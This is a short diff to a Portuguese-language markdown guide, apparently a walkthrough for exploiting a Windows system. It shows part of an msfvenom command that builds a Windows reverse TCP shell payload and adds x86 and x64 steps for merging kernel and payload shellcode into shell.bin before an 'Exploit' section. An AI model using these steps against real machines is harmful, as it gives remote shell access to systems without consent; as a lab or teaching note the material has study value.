@@ -38,10 +38,14 @@ msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=IP --platform windows -a 
 
 ### Fazendo o Merge dos arquivos:
 
+###x64
 ```
 cat sc_x64_kernel.bin sc_x64_payload.bin > shell.bin
 ```
-
+###x86
+```
+cat sc_x86_kernel.bin sc_x86_payload.bin > shell.bin
+```
 
 ## 4. Exploit:
 
